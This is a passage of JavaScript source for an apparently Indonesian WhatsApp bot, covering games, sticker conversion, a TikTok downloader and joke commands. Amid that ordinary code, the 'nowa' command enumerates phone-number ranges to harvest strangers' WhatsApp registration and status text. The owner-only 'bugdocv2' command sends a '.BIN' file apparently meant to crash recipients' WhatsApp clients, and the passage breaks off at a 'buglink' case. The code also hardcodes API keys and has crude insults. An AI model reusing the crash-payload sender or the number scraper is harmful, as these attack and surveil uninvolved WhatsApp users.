⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    freply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    freply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            freply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            hisoka.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                freply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            freply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            freply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            freply(`Berhasil delete session room tictactoe !`)
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) freply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return freply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return freply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
case 'owner': case 'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break
case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                freply(respon)
            }
            break
///================== Download
case 'tiktok':
case 'tiktoknowm':{
if (!q) return repply('Linknya?')
repply(mess.wait)
if (!q.includes('tiktok')) return m.reply('Itu bukan link tiktok!')
const musim_rambutan = await TiktokDownloader(`${q}`).catch(e => {
 m.reply('Eror') 
} )
console.log(musim_rambutan)
const musim_duren_v = musim_rambutan.result.nowatermark
      textt = `


_*TIKTOK DOWNLOADER BY FARDAN*_

  ████████▀▀▀████
  ████████────▀██
  ████████──█▄──█
  ███▀▀▀██──█████
  █▀──▄▄██──█████
  █──█████──█████
  █▄──▀▀▀──▄█████
  ███▄▄▄▄▄███████


_Jangan Lupa Donasi Iya Biar Bot Online Terus`
hisoka.sendMessage(from, { video: { url: musim_duren_v }, caption: textt, }, { quoted: m })
}
break

//============= Convert File Massage
case 'sticker': case 's': case 'stickergif': case 'sgif': {
           if (/image/.test(mime)) {
           freply(mess.wait)
                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
            freply(mess.wait)
                if (qmsg.seconds > 11) return freply('Maksimal 10 detik!')
                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                freply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
                }
            }
            break
            case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	freply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return freply('Maksimal 10 detik!')
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
//=============================== random Menu

case 'asupan':{
m.reply(mess.wait)
buffer = 'https://fax-home.herokuapp.com/api/asupan/random?apikey=925b04ib0j'
hisoka.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'doge':
case 'dogestick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'bucinstick':
case 'bucinp' :{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'patrik':
case 'patrick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'apakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
hisoka.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })
break
case 'bisakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
hisoka.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })

break
case 'bagaimanakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
hisoka.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })
break
case 'rate':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
hisoka.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })
break
case 'gantengcek':
case 'cekganteng':
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Riych`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
hisoka.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
break
case 'cantikcek':
case 'cekcantik':
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Riych`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
hisoka.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
break
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
hisoka.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
break
case 'kapankah':
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
hisoka.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
break
case 'wangy':
if (!q) return m.reply(`Contoh : .wangy Riy`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
m.reply(awikwok)
break
case 'cekmati':
if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
m.reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=============================== MEDIA MENU ===========
case 'ss': case 'ssweb': {
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
hisoka.sendMessage(m.chat, { image: { url: `https://fax-home.herokuapp.com/api/tools/ssweb?link=&apikey=925b04ib0j` }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => freply(jsonformat('*error*')))
}
break
case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
case 'meme':{
anu = await fetchJson(`https://fax-home.herokuapp.com/api/random/meme?apikey=925b04ib0j`)
buf = await getBuffer(anu.result.url) 
hisoka.sendMessage(m.chat, { image: buf }, { quoted: m })
}
break
case 'translate': case 'terjemahan': case 'tr': {
if (!args.join(" ")) return freply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
freply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            freply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            freply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await hisoka.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        freply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await hisoka.downloadMediaMessage(qmsg)
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break
            case 'toimage': case 'toimg': {
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                freply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                freply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'public': {
                if (!isCreator) throw mess.owner
                hisoka.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                hisoka.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
case 'setppbot': {
if (!isCreator) return
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var media = await hisoka.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./lib/myfunc")
var { img } = await generateProfilePicture(media)
await hisoka.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await hisoka.updateProfilePicture(botNumber, { url: media }) }
m.reply(`Sicces`)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break
case 'anticall': {
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0] === "on") {
                if (ciko) return freply(`Sudah Aktif Sebelumnya`)
                ciko = true
                freply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (!ciko) return freply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                freply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'Enable' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Disable' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode AntiCall`, hisoka.user.name, m)
                }
             }
             break
case 'nowa':
                   if (args.length < 1) return freply(`send order ${command} with Caption ${prefix + command} 628172727xx`)
                   var teks = args[0]
                   if (!teks.includes('x')) return freply('lah?')
                   freply(mess.wait)
                   function countInstances(string, word) {
                     return string.split(word).length - 1;
                   }
                   var nomer0 = teks.split('x')[0]
                   var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
                   var random_length = countInstances(teks, 'x')
var k = 1
                   var random;
                   if (random_length == 1) {
                     random = 10
                   } else if (random_length == 2) {
                     random = 100
                   } else if (random_length == 3) {
                     random = 1000
                   }

                   var nomerny = `-- List To WhatsApp --\n\n`
                   var no_bio = `\nnot Bio || \nHey there! I am using WhatsApp.\n`
                   var no_watsap = `\nNot  registered \n`

                   for (let i = 0; i < random; i++) {
                     var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                     var dom1 = nu[Math.floor(Math.random() * nu.length)]
                     var dom2 = nu[Math.floor(Math.random() * nu.length)]
                     var dom3 = nu[Math.floor(Math.random() * nu.length)]
                     var dom4 = nu[Math.floor(Math.random() * nu.length)]

                     var rndm;
                     if (random_length == 1) {
                       rndm = `${dom1}`
                     } else if (random_length == 2) {
                       rndm = `${dom1}${dom2}`
                     } else if (random_length == 3) {
                       rndm = `${dom1}${dom2}${dom3}`
                     } else if (random_length == 4) {
                       rndm = `${dom1}${dom2}${dom3}${dom4}`
                     }

                     var anu = await hisoka.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                     var anuu = anu.length !== 0 ? anu : false

                     try {
                       try {
                         var anu1 = await hisoka.fetchStatus(anu[0].jid)
                       } catch {
                         var anu1 = '401'
                       }
                       if (anu1 == '401' || anu1.status.length == 0) {
                         no_bio += `${i} wa.me/${anu[0].jid.split("@")[0]}\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       } else {
                         nomerny += `${k++} Num : ${anu[0].jid.split("@")[0]}\nWa : wa.me/${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\ndate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       }
                     } catch {
                       no_watsap += `${nomer0}${i}${nomer1}\n`
                       console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
                     }
                   }
                   freply(`\`\`\`${nomerny}\`\`\``)
                   break
case 'bugdocv2':{
if (!isCreator) return m.reply(`Khusus Owner`)
anuin = fs.readFileSync('./faraxx/ngeselin.BIN')
hisoka.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `Fardan ${ngazap(prefix)}.BIN`, title: `Fardan ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
case 'buglink':
